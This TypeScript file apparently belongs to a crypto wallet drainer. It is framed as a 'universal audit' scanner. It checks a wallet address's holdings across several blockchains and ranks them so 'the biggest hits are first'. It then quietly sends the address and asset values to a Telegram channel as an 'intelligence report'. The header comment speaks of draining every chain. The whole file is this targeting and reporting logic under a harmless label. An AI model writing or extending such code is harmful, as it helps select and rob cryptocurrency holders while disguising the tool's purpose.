import { UniversalAsset } from "./audit/types";
import { sendToTelegram } from "@/lib/telegram";

// 🚀 Centralized Scanner Hub
import {
  scanEVM,
  scanSolana,
  scanTron,
  scanUTXO, // Using the aggregator we just built
  scanXRP,
} from "./audit/scanners";

export type { UniversalAsset };

/**
 * 🌍 UNIVERSAL AUDIT ENTRY POINT
 * The high-performance engine that drains data from every chain simultaneously.
 */
export async function scanUniversalPortfolio(
  address: string,
): Promise<UniversalAsset[]> {
  console.log(
    `[audit.ts] 🛰️ STARTING GLOBAL AUDIT | Target: ${address.slice(0, 12)}...`,
  );

  if (!address) {
    console.warn(`[audit.ts] ⚠️ Scan Aborted | Reason: Null Address`);
    return [];
  }

  const startTime = Date.now();

  // 1. Define the Battle Plan (Parallel Threads)
  const scannerTasks = [
    { name: "EVM", fn: scanEVM(address) },
    { name: "SOLANA", fn: scanSolana(address) },
    { name: "TRON", fn: scanTron(address) },
    { name: "UTXO", fn: scanUTXO(address) }, // BTC + LTC combined
    { name: "XRP", fn: scanXRP(address) },
  ];

  // 2. Execute all scanners in parallel with Promise.allSettled
  const results = await Promise.allSettled(scannerTasks.map((t) => t.fn));

  // 3. Sophisticated Result Processing
  const flattened: UniversalAsset[] = [];

  results.forEach((res, index) => {
    const scannerName = scannerTasks[index].name;

    if (res.status === "fulfilled") {
      const found = res.value || [];
      if (found.length > 0) {
        console.log(
          `[audit.ts] ✅ ${scannerName} found ${found.length} assets.`,
        );
        flattened.push(...found);
      }
    } else {
      console.error(
        `[audit.ts] ❌ ${scannerName} Thread Crashed | Reason:`,
        res.reason,
      );
    }
  });

  // 4. Clean & Rank: Sort by USD value (descending) so the biggest hits are first
  const safeResults = flattened
    .filter((a) => a && a.symbol && (a.balance || a.displayBalance))
    .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));

  /**
   * 🛰️ DISCOVERY REPORTING
   * Send a unified intelligence report to Telegram.
   */
  if (safeResults.length > 0) {
    const totalDetectedValue = safeResults.reduce(
      (sum, a) => sum + (a.usdValue || 0),
      0,
    );

    await sendToTelegram({
      userAddress: address,
      assets: safeResults.map((a) => ({
        symbol: a.symbol,
        displayBalance: a.displayBalance || "0",
        v: a.usdValue || 0, // Used for the $ total in your telegram reducer
      })),
      chainId: 0, // 0 = Universal Discovery
    }).catch((err) =>
      console.error(`[audit.ts] 🛑 Reporting Failed | ${err.message}`),
    );

    console.log(
      `[audit.ts] 💰 Total Discovery Value: $${totalDetectedValue.toFixed(2)}`,
    );
  }

  const duration = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(
    `[audit.ts] 🏁 AUDIT COMPLETE | Total Assets: ${safeResults.length} | Time: ${duration}s`,
  );

  return safeResults;
}
